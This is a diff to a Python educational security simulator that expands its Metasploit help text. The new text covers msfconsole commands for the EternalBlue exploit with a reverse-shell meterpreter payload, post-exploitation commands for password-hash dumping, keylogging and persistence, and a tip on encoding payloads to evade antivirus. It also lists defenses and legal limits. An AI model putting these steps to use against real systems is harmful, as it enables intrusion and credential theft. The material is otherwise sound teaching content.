@@ -34,15 +34,77 @@ class MetasploitSimulator(ToolSimulator):
         
     def _show_metasploit_education(self):
         """Show educational information about Metasploit"""
-        description = "Metasploit is a penetration testing framework used to discover, exploit, and validate vulnerabilities. " \
-                     "It contains thousands of exploits for known vulnerabilities in various systems."
+        description = "[bold]Metasploit Framework[/bold] - Most popular exploitation framework. 2000+ exploits, 500+ payloads.\n\n"
+        description += "[bold cyan]Metasploit Components:[/bold cyan]\n"
+        description += "[bold]msfconsole:[/bold] Primary interface (what you're using).\n"
+        description += "[bold]Exploits:[/bold] Code that takes advantage of specific vulnerabilities.\n"
+        description += "  • Example: exploit/windows/smb/ms17_010_eternalblue (WannaCry vulnerability)\n"
+        description += "[bold]Payloads:[/bold] Code executed after successful exploit.\n"
+        description += "  • [cyan]Reverse Shell:[/cyan] Target connects back to attacker. Bypasses firewalls.\n"
+        description += "  • [cyan]Bind Shell:[/cyan] Opens port on target for attacker to connect.\n"
+        description += "  • [cyan]Meterpreter:[/cyan] Advanced payload with file upload/download, keylogging, screenshot, webcam.\n"
+        description += "[bold]Auxiliary:[/bold] Non-exploit modules (scanners, fuzzers, DoS).\n"
+        description += "[bold]Post:[/bold] Post-exploitation modules (privilege escalation, password dumping).\n"
+        description += "[bold]Encoders:[/bold] Obfuscate payloads to evade antivirus.\n\n"
+        description += "[bold cyan]Key msfconsole Commands:[/bold cyan]\n"
+        description += "[bold]search <term>:[/bold] Find exploits/modules.\n"
+        description += "  • search eternalblue\n"
+        description += "  • search type:exploit platform:windows cve:2017\n"
+        description += "[bold]use <module>:[/bold] Select exploit/auxiliary module.\n"
+        description += "  • use exploit/windows/smb/ms17_010_eternalblue\n"
+        description += "[bold]show options:[/bold] Display required/optional parameters.\n"
+        description += "[bold]set <option> <value>:[/bold] Configure module.\n"
+        description += "  • set RHOSTS 192.168.1.100 (target IP)\n"
+        description += "  • set LHOST 192.168.1.50 (your IP for reverse shell)\n"
+        description += "  • set LPORT 4444 (your listening port)\n"
+        description += "  • set PAYLOAD windows/meterpreter/reverse_tcp\n"
+        description += "[bold]exploit / run:[/bold] Execute the module.\n"
+        description += "[bold]sessions:[/bold] Manage active sessions.\n"
+        description += "  • sessions -l (list sessions)\n"
+        description += "  • sessions -i 1 (interact with session 1)\n"
+        description += "[bold]background:[/bold] Background current session (Ctrl+Z).\n"
+        description += "[bold]db_nmap:[/bold] Run nmap and import results to Metasploit database.\n"
+        description += "[bold]check:[/bold] Test if target is vulnerable (non-exploiting).\n\n"
+        description += "[bold cyan]Meterpreter Commands (Post-Exploitation):[/bold cyan]\n"
+        description += "[bold]sysinfo:[/bold] Display system information.\n"
+        description += "[bold]getuid:[/bold] Get current user.\n"
+        description += "[bold]getsystem:[/bold] Attempt privilege escalation to SYSTEM.\n"
+        description += "[bold]hashdump:[/bold] Dump password hashes (requires SYSTEM).\n"
+        description += "[bold]screenshot:[/bold] Capture screenshot.\n"
+        description += "[bold]keyscan_start:[/bold] Start keylogger.\n"
+        description += "[bold]upload/download:[/bold] File transfer.\n"
+        description += "[bold]shell:[/bold] Drop into system shell.\n"
+        description += "[bold]persistence:[/bold] Create backdoor that survives reboots."
         
-        impact = "Real Metasploit would:\n" \
-                "  • Execute actual exploits against vulnerable systems\n" \
-                "  • Create reverse shells and command sessions\n" \
-                "  • Upload payloads and potentially gain system access\n" \
-                "  • Modify target system files and processes\n" \
-                "  • Be considered a criminal act without written authorization"
+        impact = "[bold red]Real Metasploit Impact:[/bold red]\n" \
+                "• [red]Full System Compromise:[/red] Successful exploit often = SYSTEM/root access.\n" \
+                "• [red]Persistent Access:[/red] Backdoors survive reboots, updates, even OS reinstalls.\n" \
+                "• [red]Data Exfiltration:[/red] Download files, databases, password hashes, SSH keys.\n" \
+                "• [red]Lateral Movement:[/red] Use compromised host to attack other network systems.\n" \
+                "• [red]Destructive Actions:[/red] Delete logs, corrupt files, deploy ransomware.\n" \
+                "• [yellow]Detection:[/yellow]\n" \
+                "  - Antivirus detects known payloads (use encoders/custom payloads)\n" \
+                "  - Network IDS detects exploit traffic patterns\n" \
+                "  - EDR (Endpoint Detection & Response) detects post-exploitation behavior\n" \
+                "  - SIEM correlates suspicious activities\n" \
+                "• [red]Legal:[/red] Unauthorized exploitation = Computer Fraud and Abuse Act. Federal felony. 5-20 years prison.\n\n" \
+                "[bold green]Defenses (Defense in Depth):[/bold green]\n" \
+                "1. [green]Patch Management:[/green] Update systems immediately. Most exploits target known vulnerabilities.\n" \
+                "2. [green]Network Segmentation:[/green] VLANs, firewalls limit lateral movement.\n" \
+                "3. [green]Least Privilege:[/green] Users shouldn't have admin rights. Limits post-exploitation.\n" \
+                "4. [green]Antivirus/EDR:[/green] Detects known payloads, behavioral analysis.\n" \
+                "5. [green]IDS/IPS:[/green] Snort, Suricata detect exploit traffic.\n" \
+                "6. [green]Application Whitelisting:[/green] Only allow approved executables.\n" \
+                "7. [green]Disable Unnecessary Services:[/green] SMBv1, Telnet, FTP often exploited.\n" \
+                "8. [green]Monitor Outbound:[/green] Reverse shells create unusual outbound connections.\n" \
+                "9. [green]Log Analysis:[/green] SIEM detects anomalies (new service, unusual process).\n" \
+                "10. [green]Backups:[/green] Offline backups for ransomware recovery.\n\n" \
+                "[bold cyan]Ethical Use ONLY:[/bold cyan]\n" \
+                "• Authorized penetration tests with written contract\n" \
+                "• Bug bounties within defined scope\n" \
+                "• Your own lab environment (VirtualBox, VMware)\n" \
+                "• CTF competitions, HackTheBox, TryHackMe\n" \
+                "• Education with vulnerable VMs (Metasploitable, DVWA)"
         
         self._show_educational_info("Metasploit Framework", description, impact)
         
